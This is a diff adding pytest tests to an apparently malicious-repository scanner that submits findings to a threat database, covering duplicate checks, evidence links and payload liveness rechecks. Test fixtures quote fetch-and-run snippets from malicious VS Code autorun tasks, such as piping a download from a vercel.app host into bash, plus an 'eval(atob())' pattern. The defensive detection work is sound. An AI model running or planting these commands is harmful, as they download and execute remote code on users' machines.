@@ -150,6 +150,96 @@ def test_submit_threat_requires_a_token(monkeypatch):
         submit_threat({}, token=None, http=object())
 
 
+def test_full_history_gate_catches_old_report_query_latest_misses(monkeypatch):
+    """The authoritative novelty gate must flag a repo already in OSM even when it
+    is a months-old report (invisible to query-latest's recent window), matching
+    on ANY resource_identifier spelling -- the exact gap that caused duplicates."""
+    import git_warden.osm_submit as osm
+
+    # OSM stored this repo months ago as scheme+trailing-slash; our submit uses
+    # scheme+no-slash, so only a multi-variant search finds it.
+    stored = {"id": "6e001ebb-old", "status": "verified",
+              "resource_identifier": "https://github.com/hvmgeeks/frontendengine1/"}
+
+    def fake_search(term, *, token=None, http=None):
+        return [stored] if term == "https://github.com/hvmgeeks/frontendengine1/" else []
+
+    monkeypatch.setattr(osm, "OSM_API_KEY", "osm_test")
+    monkeypatch.setattr(osm, "osm_search", fake_search)
+
+    hit = osm.osm_existing_repo("hvmgeeks/frontendengine1")
+    assert hit and hit["id"] == "6e001ebb-old" and hit["status"] == "verified"
+    # case-insensitivity: OSM stores POS_backend, we look up pos_backend
+    monkeypatch.setattr(osm, "osm_search", lambda term, **k: (
+        [{"id": "dae93423", "status": "verified",
+          "resource_identifier": "https://github.com/findusman/POS_backend"}]
+        if term.rstrip("/").casefold() == "https://github.com/findusman/pos_backend" else []))
+    assert osm.osm_existing_repo("findusman/pos_backend")["id"] == "dae93423"
+    # a genuinely novel repo is NOT blocked
+    monkeypatch.setattr(osm, "osm_search", lambda term, **k: [])
+    assert osm.osm_existing_repo("torvalds/linux") is None
+
+
+def test_evidence_pins_to_commit_sha_when_present():
+    """Evidence links must pin to the scanned commit SHA (permanent), falling back
+    to HEAD only when no SHA was recorded (older findings)."""
+    from git_warden.osm_submit import _evidence_refs
+    sha = "a" * 40
+    with_sha = _row(raw_payload=json.dumps({
+        "commit_sha": sha,
+        "bash_findings": [{"file": ".vscode/tasks.json", "line": 3, "rule": "vscode-autorun",
+                           "category": "install_hook", "snippet": "curl x | bash"}]}))
+    refs = _evidence_refs(with_sha)
+    assert f"/blob/{sha}/.vscode/tasks.json#L3" in refs and "/blob/HEAD/" not in refs
+    # no SHA recorded -> graceful HEAD fallback
+    no_sha = _row(raw_payload=json.dumps({
+        "bash_findings": [{"file": "x.js", "line": 1, "rule": "eval-decoded",
+                           "category": "obfuscation", "snippet": "eval(atob())"}]}))
+    assert "/blob/HEAD/x.js#L1" in _evidence_refs(no_sha)
+
+
+def test_liveness_recheck_skips_when_payload_removed():
+    """repo_payload_live returns False when the evidence file 404s at HEAD, True when
+    the distinctive token is still present, None (fail-open) on a transient error."""
+    from git_warden.osm_submit import repo_payload_live
+    row = _row(full_name="evil/dropper", raw_payload=json.dumps({"bash_findings": [
+        {"file": ".vscode/tasks.json", "line": 1, "rule": "vscode-autorun",
+         "category": "install_hook",
+         "snippet": "curl https://default-configuration.vercel.app/x | bash"}]}))
+    live_body = "curl https://default-configuration.vercel.app/x | bash"
+    assert repo_payload_live(row, fetch=lambda u: (404, "")) is False
+    assert repo_payload_live(row, fetch=lambda u: (200, live_body)) is True
+    assert repo_payload_live(row, fetch=lambda u: (200, "clean file, nothing here")) is False
+    def boom(u):
+        raise OSError("network down")
+    assert repo_payload_live(row, fetch=boom) is None
+
+
+def test_audit_reports_status_and_flags_duplicates(tmp_path, monkeypatch, capsys):
+    """--audit reports each submission's OSM status and flags a canonical/ours id
+    mismatch as a likely duplicate."""
+    import git_warden.osm_submit as osm
+    dbp = tmp_path / "a.sqlite"
+    db = Database.open(dbp)
+    db.start_run("run-1", utcnow())
+    _confirmed(db, "good/real", DetectionMethod.SIGNATURE_MATCH)
+    _confirmed(db, "dup/repo", DetectionMethod.SIGNATURE_MATCH)
+    from git_warden.osm_submit import mark_osm_submitted
+    mark_osm_submitted(db, "good/real", "id-ours-1")
+    mark_osm_submitted(db, "dup/repo", "id-ours-2")
+
+    def fake_existing(full_name, **k):
+        if full_name == "good/real":
+            return {"id": "id-ours-1", "status": "verified"}       # canonical == ours -> not a dup
+        return {"id": "canonical-9", "status": "false_positive"}   # differs from ours -> DUP
+    monkeypatch.setattr(osm, "osm_existing_repo", fake_existing)
+    osm.audit(db)
+    out = capsys.readouterr().out
+    assert "VERIFIED" in out and "FALSE_POSITIVE" in out
+    assert "duplicates to decline" in out.lower() or "DUP" in out
+    db.close()
+
+
 def _confirmed(db, name, method):
     db.upsert_finding(RepoFinding(
         full_name=name, detection_method=method, status=RepoFindingStatus.CONFIRMED,
@@ -312,6 +402,8 @@ def test_submit_main_keeps_claim_when_post_succeeds(tmp_path, monkeypatch):
     monkeypatch.setattr(osm, "submit_threat",
                         lambda *a, **k: {"threat_id": "tid-9", "status": "pending"})
     monkeypatch.setattr(osm, "osm_current_reports", lambda *a, **k: {})  # no live OSM read
+    monkeypatch.setattr(osm, "osm_existing_repo", lambda *a, **k: None)  # treat as novel
+    monkeypatch.setattr(osm, "repo_payload_live", lambda *a, **k: True)  # skip live fetch
     osm.main(["--confirm", "--db", str(dbp)])
 
     db = Database.open(dbp)
